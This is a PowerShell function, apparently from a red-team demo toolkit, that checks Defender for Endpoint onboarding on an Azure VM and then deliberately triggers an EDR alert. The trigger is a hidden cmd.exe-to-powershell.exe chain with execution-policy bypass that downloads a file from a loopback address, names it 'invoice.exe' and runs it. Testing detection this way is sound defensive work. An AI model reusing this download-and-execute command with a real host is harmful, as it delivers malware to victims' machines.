<#
.SYNOPSIS
    Deploys the EDR Detection Test to a target Azure VM.

.DESCRIPTION
    Verifies device onboarding and runs the EDR detection command that
    triggers an alert in the Microsoft Defender portal.
    Called by Start-RedTide.ps1 -- do not run directly.
#>

function Deploy-EdrDetectionStrike {
    [CmdletBinding(SupportsShouldProcess)]
    param()

    Write-Log 'Step 1/2: Verifying Defender for Endpoint onboarding...'
    $step1 = Invoke-DemoCommand -Description 'Check MDE onboarding status' -ScriptContent @'
        # Check if the Sense service (MDE sensor) is running
        $sense = Get-Service -Name 'Sense' -ErrorAction SilentlyContinue
        if ($sense -and $sense.Status -eq 'Running') {
            Write-Output "OK: Defender for Endpoint sensor (Sense) is running."
        }
        elseif ($sense) {
            Write-Output "FAIL: Sense service exists but status is: $($sense.Status)"
        }
        else {
            Write-Output "FAIL: Sense service not found. Device may not be onboarded to Defender for Endpoint."
        }

        # Check onboarding status in registry
        $regPath = 'HKLM:\SOFTWARE\Microsoft\Windows Advanced Threat Protection\Status'
        if (Test-Path $regPath) {
            $onboarded = (Get-ItemProperty -Path $regPath -ErrorAction SilentlyContinue).OnboardingState
            Write-Output "OnboardingState: $onboarded (1 = onboarded)"
        }
        else {
            Write-Output "WARN: ATP registry key not found."
        }
'@
    if (-not $step1.Success) { return $false }

    if ($step1.Output -match 'FAIL:.*not found|FAIL:.*not onboarded') {
        Write-Log 'Device is not onboarded to Defender for Endpoint. Cannot run EDR test.' -Level ERROR
        Write-Log 'Onboard the device first: Settings > Endpoints > Onboarding in the Defender portal.' -Level WARN
        return $false
    }

    Write-Log 'Step 2/3: Running EDR detection test command...'
    $step2 = Invoke-DemoCommand -Description 'Execute EDR test command via cmd.exe process chain' -ExpectErrors -ScriptContent @'
        # Create the test directory
        New-Item -ItemType Directory -Path 'C:\MDE-Demo\edr-test' -Force | Out-Null

        # The EDR detection requires a specific process chain: cmd.exe spawning powershell.exe
        # with suspicious download-and-execute arguments. RunCommand runs as SYSTEM through
        # the VM agent, so we must explicitly create the cmd.exe -> powershell.exe chain.
        $proc = Start-Process -FilePath 'cmd.exe' -ArgumentList '/c', 'powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference=''silentlycontinue'';(New-Object System.Net.WebClient).DownloadFile(''http://127.0.0.1/1.exe'', ''C:\MDE-Demo\edr-test\invoice.exe'');Start-Process ''C:\MDE-Demo\edr-test\invoice.exe''' -PassThru -WindowStyle Hidden

        # Give the process chain a moment to execute and be observed by the sensor
        Start-Sleep -Seconds 5

        # Clean up the spawned process
        if ($proc -and -not $proc.HasExited) {
            Stop-Process -Id $proc.Id -Force -ErrorAction SilentlyContinue
        }

        Write-Output "EDR test command executed (cmd.exe PID: $($proc.Id))."
        Write-Output "The process chain cmd.exe -> powershell.exe with download arguments triggers the detection."
        Write-Output "An alert should appear in the Defender portal within 2-10 minutes."
        Write-Output "Portal: https://security.microsoft.com/alerts"
'@
    if (-not $step2.Success) { return $false }

    Write-Log 'EDR detection test executed.' -Level SUCCESS
    Write-Log 'An alert should appear in the Defender portal within 2-10 minutes.' -Level INFO
    Write-Log 'Portal URL: https://security.microsoft.com/alerts' -Level INFO
    return $true
}
